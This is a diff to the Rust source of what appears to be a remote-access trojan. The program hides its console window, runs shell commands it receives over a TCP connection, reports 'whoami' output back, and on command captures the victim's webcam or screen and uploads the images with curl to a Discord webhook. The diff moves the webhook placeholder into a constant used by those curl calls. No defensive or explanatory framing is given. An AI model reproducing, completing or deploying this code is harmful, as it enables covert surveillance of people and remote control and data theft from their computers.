@@ -1,4 +1,5 @@
 #![windows_subsystem = "windows"]
+static webhook: &'static str = "YOUR_DISCORD_WEBHOOK";
 use std::thread;
 use std::net::{TcpListener, TcpStream, Shutdown};
 use std::io::{Read, Write};
@@ -71,8 +72,8 @@ fn exec_shell(command: &str) -> String {
 }
 
 fn handle_input(mut stream: TcpStream) {
-    
-    let mut data = [0 as u8; 1024*100];
+   
+    let mut data = [0 as u8; 1024*10];
     stream.write(exec_sys("whoami").as_bytes()).unwrap(); //Get the hostname
     loop {
         //Listen for commands
@@ -99,12 +100,13 @@ fn handle_input(mut stream: TcpStream) {
                             break;
                         }
                         stream.write(b"Webcam captured successfully.").unwrap();
-                        exec_sys(r#"curl -i -H 'Expect: application/json' -F file=@shot.png -F 'payload_json={ "wait": true, "content": " ", "username": "File Bot" }' YOUR_WEBHOOK"#);
-                        stream.write("".as_bytes()).unwrap();
+                       let command1 = r#"curl -i -H 'Expect: application/json' -F file=@shot.png -F 'payload_json={ "wait": true, "content": " ", "username": "File Bot" }'"#;
+                        exec_sys(format!("{} {}", command1, webhook));
                         } else if content == "screen" {
                             screenshot();
                             stream.write(b"Screen captured successfully.").unwrap();
-                            exec_sys(r#"curl -i -H 'Expect: application/json' -F file=@screenshot.png -F 'payload_json={ "wait": true, "content": " ", "username": "File Bot" }' YOUR_WEBHOOK"#);
+                            let command2 = r#"curl -i -H 'Expect: application/json' -F file=@screenshot.png -F 'payload_json={ "wait": true, "content": " ", "username": "File Bot" }'"#;
+                            exec_sys(format!("{} {}", command2, webhook));
                             
                         }
                         
